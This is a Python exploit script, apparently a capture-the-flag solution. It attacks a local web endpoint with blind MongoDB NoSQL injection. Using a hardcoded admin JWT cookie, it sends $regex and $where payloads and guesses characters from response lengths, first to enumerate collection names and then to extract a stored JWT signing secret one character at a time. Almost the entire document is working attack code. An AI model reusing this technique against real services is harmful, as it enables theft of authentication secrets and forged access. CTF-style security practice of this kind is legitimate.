#!/usr/bin/env python3
import requests
import string
import json

letters = string.ascii_letters + string.digits + '_-'

endpoint = 'http://127.0.0.1:8081/clearBricks'

cookies = {'access_token_cookie': "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0OTM0Mzg0MiwianRpIjoiY2U5MjNiOWMtNDQ2NC00OGRhLWJjNjctZTZhMmQ2ZDc2YjMzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNjQ5MzQzODQyLCJleHAiOjE2NDkzNTM4NDIsImJyaWNrc19rZXlfcGF0aCI6InNlY3JldHMvMSJ9.xhb7Jh5kMCAHhPRReDau3w1FLZLwswl9IO12zh29YVI"}

def get_next_letter(request, prev_count, ts=88):
    n = []
    for i in letters:
        data = request.replace("**payload**", '^'+'.'*prev_count+i)
        data = json.loads(data)
        r = requests.post(endpoint, cookies=cookies, json=data)
        if r.status_code == 200 and r.json()['db_response_length'] > ts:
            n.append(i)
    return n

def get_next_by_list(request, prev, l, ts=88):
    n = []
    for i in l:
        data = request.replace("**payload**", "^"+prev+i)
        data = json.loads(data)
        r = requests.post(endpoint, cookies=cookies, json=data)
        if r.status_code == 200 and r.json()['db_response_length'] > ts:
            n.append(prev+i)
    return n


lets = []
for i in range(20):
    tmp = get_next_letter('{"args":["listCollections"],"kwargs":{"filter":{"name":{"$regex": "**payload**"}}}}', i)
    if not tmp:
        break
    lets.append(tmp)


dumps = []
variants = lets[0]
for i in range(1, len(lets)):
    tmp_variants = []
    for j in variants:
        n = get_next_by_list('{"args":["listCollections"],"kwargs":{"filter":{"name":{"$regex": "**payload**"}}}}', j, lets[i])
        tmp_variants += n
    if len(tmp_variants) < len(variants):
        dumps += variants
    variants = tmp_variants

dumps += variants

fields = []
for i in dumps:
    data = {"args":["find", i], "kwargs": {}}
    r = requests.post(endpoint, cookies=cookies, json=data)
    if r.status_code == 200 and r.json()['db_response_length'] > 74:
        fields.append(i)

print(fields)

# Enumerate fields using the request:
# data = {"args":["find", "jwt_secret"],"kwargs":{"filter":{"username":{"$where":"function () { var findKey = new RegExp('^**payload**'); function inspectObj(doc) { return Object.keys(doc).some(function(key) { if ( typeof(doc[key]) == 'object' ) { return inspectObj(doc[key]);}else { return findKey.test(key);}});}return inspectObj(this);}"}}}
# https://stackoverflow.com/questions/44254923/search-by-regex-on-field-name
#
# got 'secret' field

def get_data_from_field(coll_name, field_name, prev_count):
    letters_data = string.ascii_letters + string.digits + '_-./\\=+'
    d = []
    for i in letters_data:
        if i in '_-./\\=+':
            i = '\\'+i
        data = {"args":["find", coll_name],"kwargs":{"filter":{field_name:{"$regex": "^"+'.'*prev_count+i}}}}
        r = requests.post(endpoint, cookies=cookies, json=data)
        if r.status_code == 200 and r.json()['db_response_length'] > 78:
            d.append(i)
    return d


dump = []
for i in range(100):
    data = get_data_from_field('jwt_secret', 'secret', i)
    if not data:
        break
    dump.append(data)

print(dump)
secret = ''
for i in dump:
    if len(i[0]) == 2:
        secret += i[0][1]
    else:
        secret += i[0]
print(secret)
